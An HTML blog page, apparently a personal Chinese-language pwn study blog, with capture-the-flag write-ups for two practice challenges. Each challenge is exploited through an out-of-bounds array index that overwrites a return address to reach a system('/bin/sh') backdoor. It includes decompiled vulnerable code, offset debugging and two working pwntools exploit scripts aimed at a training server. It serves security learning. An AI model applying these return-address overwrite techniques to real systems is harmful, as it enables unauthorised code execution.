@@ -1,0 +1,549 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="wustctf2020_name_your_cat思路​	检查保护，32位程序，开了NX和canary保护   ​	分析源码，程序有后门函数，整体思路就是两次输入分别写进两个地址，这个过程循环5次，然后跳出主函数。 int shell()&#123;  return system(&quot;&#x2F;bin&#x2F;sh&quot;);&#125;int __cdecl NameWhich(int a1)&amp;#1">
+<meta property="og:type" content="article">
+<meta property="og:title" content="两道有关索引越界的例题">
+<meta property="og:url" content="http://example.com/2024/02/19/%E4%B8%A4%E9%81%93%E6%9C%89%E5%85%B3%E7%B4%A2%E5%BC%95%E8%B6%8A%E7%95%8C%E7%9A%84%E4%BE%8B%E9%A2%98/index.html">
+<meta property="og:site_name" content="Qwen&#39;s blog">
+<meta property="og:description" content="wustctf2020_name_your_cat思路​	检查保护，32位程序，开了NX和canary保护   ​	分析源码，程序有后门函数，整体思路就是两次输入分别写进两个地址，这个过程循环5次，然后跳出主函数。 int shell()&#123;  return system(&quot;&#x2F;bin&#x2F;sh&quot;);&#125;int __cdecl NameWhich(int a1)&amp;#1">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202503252011271.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202503252011573.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202503252011731.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202503252011873.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202503252011674.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202503252011001.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202503252011439.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202503252011193.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202503252010737.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202503252010240.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202503252010731.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202503252009547.png">
+<meta property="article:published_time" content="2024-02-19T12:09:32.000Z">
+<meta property="article:modified_time" content="2025-03-25T12:13:46.095Z">
+<meta property="article:author" content="Qwen">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="栈">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Qwen11/picture/main/202503252011271.png">
+
+<link rel="canonical" href="http://example.com/2024/02/19/%E4%B8%A4%E9%81%93%E6%9C%89%E5%85%B3%E7%B4%A2%E5%BC%95%E8%B6%8A%E7%95%8C%E7%9A%84%E4%BE%8B%E9%A2%98/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>两道有关索引越界的例题 | Qwen's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Qwen's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2024/02/19/%E4%B8%A4%E9%81%93%E6%9C%89%E5%85%B3%E7%B4%A2%E5%BC%95%E8%B6%8A%E7%95%8C%E7%9A%84%E4%BE%8B%E9%A2%98/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar_1.jpg">
+      <meta itemprop="name" content="Qwen">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Qwen's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          两道有关索引越界的例题
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2024-02-19 20:09:32" itemprop="dateCreated datePublished" datetime="2024-02-19T20:09:32+08:00">2024-02-19</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-03-25 20:13:46" itemprop="dateModified" datetime="2025-03-25T20:13:46+08:00">2025-03-25</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/" itemprop="url" rel="index"><span itemprop="name">pwn学习总结</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="wustctf2020-name-your-cat"><a href="#wustctf2020-name-your-cat" class="headerlink" title="wustctf2020_name_your_cat"></a><code>wustctf2020_name_your_cat</code></h1><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>​	检查保护，<code>32</code>位程序，开了<code>NX</code>和<code>canary</code>保护</p>
+<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503252011271.png" alt="image-20240219185444801" style="zoom:67%;" />
+
+<p>​	分析源码，程序有后门函数，整体思路就是两次输入分别写进两个地址，这个过程循环<code>5</code>次，然后跳出主函数。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">shell</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">NameWhich</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v2[<span class="number">4</span>]; <span class="comment">// [esp+18h] [ebp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v2[<span class="number">1</span>] = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Name for which?\n&gt;&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, v2);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Give your name plz: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%7s&quot;</span>, <span class="number">8</span> * v2[<span class="number">0</span>] + a1);</span><br><span class="line">  <span class="keyword">return</span> v2[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">vulnerable</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+Ch] [ebp-3Ch]</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [esp+10h] [ebp-38h]</span></span><br><span class="line">  <span class="type">char</span> v3[<span class="number">40</span>]; <span class="comment">// [esp+14h] [ebp-34h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// [esp+3Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;I bought you five famale cats.Name for them?&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">1</span>; i &lt;= <span class="number">5</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = NameWhich((<span class="type">int</span>)v3);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;You get %d cat!!!!!!\nlemonlemonlemonlemonlemonlemonlemon5555555\n&quot;</span>, i);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Her name is:%s\n\n&quot;</span>, &amp;v3[<span class="number">8</span> * v2]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>​	我们分析漏洞函数<code>NameWhich</code>，<code>v2</code>是一个数组，第一次输入，我们是从<code>v2</code>的起始地址（即<code>v2[0]</code>）开始写，第二次输入被写到<code>8*v2[0]+a1</code>这个地址。我们就可以通过第一次输入的内容控制第二次输入被写的地址距离<code>a1</code>的起始地址的偏移。</p>
+<p>​	返回地址距离<code>a1</code>的起始地址的偏移为<code>0x34+4=56</code>个字节，也就是说第一次输入<code>7</code>，第二次输入就可以覆盖返回地址。</p>
+<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503252011573.png" alt="image-20240219192825555" style="zoom:80%;" />
+
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a><code>exp</code></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process(&#x27;./name&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">28394</span>)</span><br><span class="line"><span class="comment">#debug(p)</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Name for which?\n&gt;&quot;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Give your name plz: &quot;</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Name for which?\n&gt;&quot;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Give your name plz: &quot;</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Name for which?\n&gt;&quot;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Give your name plz: &quot;</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Name for which?\n&gt;&quot;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Give your name plz: &quot;</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shell_addr = <span class="number">0x080485cb</span></span><br><span class="line">payload = p32(shell_addr)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Name for which?\n&gt;&quot;</span>,<span class="string">b&#x27;7&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Give your name plz: &quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>拿到<code>flag</code></p>
+<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503252011731.png" alt="image-20240219194037922" style="zoom: 67%;" />
+
+<h1 id="qctf2018-stack2"><a href="#qctf2018-stack2" class="headerlink" title="qctf2018_stack2"></a><code>qctf2018_stack2</code></h1><h2 id="学习与收获"><a href="#学习与收获" class="headerlink" title="学习与收获"></a>学习与收获</h2><p>通过本题的学习与收获有：</p>
+<ol>
+<li>在<code>ida</code>中计算的偏移量有时候会有错误，如果在思路正确啥的都正确的时候还打不通，并且找不到错误在哪儿，一定要在<code>gdb</code>中重新算一下偏移量。</li>
+</ol>
+<h2 id="保护-源码"><a href="#保护-源码" class="headerlink" title="保护&amp;源码"></a>保护&amp;源码</h2><p>保护：</p>
+<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503252011873.png" alt="image-20240307161634907" style="zoom:80%;" />
+
+<p>源码：</p>
+<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503252011674.png" alt="image-20240307161947166" style="zoom:67%;" />
+
+<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503252011001.png" alt="image-20240307162150734" style="zoom:80%;" />
+
+<h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h2><p>​	程序中有后门函数，代码比较长，不过我们仔细分析一下就能找到漏洞点，下图这里，一个索引越界的漏洞。我们可以控制<code>v5</code>为<code>v13</code>起始地址距离装返回地址的地址的偏移量，控制<code>v7</code>为后门函数地址，便可覆盖返回地址为后门函数地址。</p>
+<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503252011439.png" alt="image-20240307162715000"></p>
+<p>​	接下来我们需要确定偏移量。一开始我是在<code>ida</code>中计算的偏移量，这个<code>var_70</code>就是<code>v13</code>，偏移量为<code>0x74</code>。不过本题在<code>ida</code>看的偏移量是错误的，我们需要动态调试一下。</p>
+<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503252011193.png" alt="image-20240307163736180" style="zoom:80%;" />
+
+<p>下图中，<code>0xffffd010</code>是<code>v7</code>的起始地址</p>
+<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503252010737.png" alt="image-20240307164308647"></p>
+<p>下图中，<code>0xffffd0ac</code>是装<code>main</code>函数返回地址的栈地址</p>
+<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503252010240.png" alt="image-20240307164417694"></p>
+<p>​	<code>v7</code>到<code>esp</code>的偏移为<code>0x9c</code>，<code>v7</code>距离<code>v13</code>的偏移为<code>0x88-0x70 = 0x18</code>，故<code>v13</code>距离<code>esp</code>的偏移为<code>0x9c-0x18 = 0x84</code>。</p>
+<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503252010731.png" alt="image-20240307164926323"></p>
+<p>​	最后还有一个地方也是我一开始没有注意到的，<code>v13[]</code>是<code>char</code>类型的，我们一次只能往地址里写一个字符也就是一个字节，后门函数地址<code>0x0804859b</code>有<code>4</code>个字节，所以我们要分<code>4</code>次写入。</p>
+<h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a><code>exp</code></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process(&#x27;./stack2&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">26404</span>)</span><br><span class="line"><span class="comment">#debug(p)</span></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line"><span class="comment">#p.recvuntil(b&#x27;5. exit\n&#x27;)</span></span><br><span class="line">backdoor_addr = [<span class="number">0x9b</span>,<span class="number">0x85</span>,<span class="number">0x04</span>,<span class="number">0x08</span>]</span><br><span class="line">offset = <span class="number">0x84</span></span><br><span class="line"><span class="comment">#p.sendline(3)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;5. exit&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;change:&quot;</span>,<span class="built_in">str</span>(offset+i))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;new number:&quot;</span>,<span class="built_in">str</span>(backdoor_addr[i]))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;5. exit&quot;</span>,<span class="built_in">str</span>(<span class="number">5</span>))</span><br><span class="line"> </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>拿到<code>flag</code></p>
+<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503252009547.png" alt="image-20240310143745724"></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/pwn/" rel="tag"># pwn</a>
+              <a href="/tags/%E6%A0%88/" rel="tag"># 栈</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2024/01/29/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/" rel="prev" title="格式化字符串漏洞学习总结">
+      <i class="fa fa-chevron-left"></i> 格式化字符串漏洞学习总结
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2024/03/01/BUU%E5%88%B7%E9%A2%98/ciscn_2019_sw_1/" rel="next" title="ciscn_2019_sw_1">
+      ciscn_2019_sw_1 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+      <!-- require APlayer -->
+      <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.css">
+      <script src="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.js"></script>
+      <!-- require MetingJS-->
+      <script src="https://cdn.jsdelivr.net/npm/meting@2.0.1/dist/Meting.min.js"></script>
+      <meting-js
+        auto="https://y.qq.com/n/yqq/playlist/9454682797.html#stat=y_new.playlist.pic_click">
+      </meting-js>
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#wustctf2020-name-your-cat"><span class="nav-number">1.</span> <span class="nav-text">wustctf2020_name_your_cat</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF"><span class="nav-number">1.1.</span> <span class="nav-text">思路</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exp"><span class="nav-number">1.2.</span> <span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#qctf2018-stack2"><span class="nav-number">2.</span> <span class="nav-text">qctf2018_stack2</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AD%A6%E4%B9%A0%E4%B8%8E%E6%94%B6%E8%8E%B7"><span class="nav-number">2.1.</span> <span class="nav-text">学习与收获</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%9D%E6%8A%A4-%E6%BA%90%E7%A0%81"><span class="nav-number">2.2.</span> <span class="nav-text">保护&amp;源码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF-1"><span class="nav-number">2.3.</span> <span class="nav-text">思路</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exp-1"><span class="nav-number">2.4.</span> <span class="nav-text">exp</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Qwen"
+      src="/images/avatar_1.jpg">
+  <p class="site-author-name" itemprop="name">Qwen</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">33</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Qwen</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+
+
+
+    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
